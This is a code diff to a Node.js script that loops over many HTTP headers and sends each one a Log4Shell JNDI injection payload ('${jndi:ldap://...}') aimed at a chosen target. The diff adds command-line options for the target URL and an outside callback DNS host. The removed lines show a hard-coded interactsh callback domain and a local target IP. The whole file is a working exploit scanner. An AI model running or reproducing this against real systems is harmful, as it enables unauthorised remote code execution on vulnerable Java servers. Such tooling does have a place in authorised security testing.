@@ -1,5 +1,22 @@
 import got from "got";
 import { HttpsProxyAgent } from "hpagent";
+import { Command } from 'commander';
+
+///////////////////////////////////////////////////////////////
+const program = new Command();
+program
+  .requiredOption('-t, --target <type>', 'target')
+  .requiredOption('-c, --callbackDNS <type>', 'callbackdns')
+
+program.parse(process.argv);
+
+const options = program.opts();
+console.log("------------------------------------------------------")
+if (options.target) { console.log(`target was set: ${program.opts().target}`); };
+if (options.callbackDNS) { console.log(`callbackdns was set: ${program.opts().callbackDNS}`); };
+console.log("------------------------------------------------------")
+console.log("")
+///////////////////////////////////////////////////////////////
 
 const agentConfig = new HttpsProxyAgent({
   keepAlive: true,
@@ -14,9 +31,9 @@ const headersList = ["Referer","X-Api-Version","Accept-Charset","Accept-Datetime
 
 for (let header of headersList) {
   console.log("sending request for: " + header);
-  let payload = "${jndi:ldap://"+header+".c6vpp912vtc0000sxws0gdp5mfryyyyyb.interactsh.com/0ey0jqu}"
+  let payload = "${jndi:ldap://"+header+"."+program.opts().callbackDNS+"}"
   let h = {[header]: payload}
-  await sendRequest("http://192.168.0.128:8080/", h);
+  await sendRequest(program.opts().target, h);
 };
 
 async function sendRequest(url, myheaders){
